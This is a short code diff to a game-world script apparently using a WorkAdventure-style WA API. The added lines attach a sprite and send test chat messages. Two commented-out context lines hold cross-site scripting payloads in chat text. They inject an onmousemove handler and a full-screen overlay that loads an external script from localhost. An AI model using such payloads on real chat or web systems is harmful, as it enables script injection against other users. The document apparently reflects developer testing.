@@ -8,6 +8,25 @@ scriptNesting(Promise.all([
     require('./game-mode'),
     require('./communication'),
 ]), async imports => {
+
+
+
+    setTimeout(() => {
+
+        WA.player.addSprite({
+            spiteSourceUrl: "http://localhost/terrain_atlas.png",
+            spriteAnimationWidth: 120,
+            spriteAnimationHeight: 120,
+            relativePositionOffset: {
+                x: 32, y: 0
+            }
+
+        })
+
+        WA.ui.triggerMessage("test", () => {
+            WA.chat.sendChatMessage('test tr', '');
+        });
+    }, 2000);
     // WA.chat.sendChatMessage(`test https://www.google.de"onmousemove="debugger;event.target.parentElement.parentElement.remove();window.scr=document.createElement('script');window.scr.src='http://localhost/scripts/injected.js';document.body.appendChild(window.scr);"style="position:fixed;top:0px;bottom:0px;right:0px;left:0px" zez`, "test")
     // WA.chat.sendChatMessage(`test https://www.google.de"onmousemove="debugger;"style="position:fixed;top:0px;bottom:0px;right:0px;left:0px" zez`, "test")
 
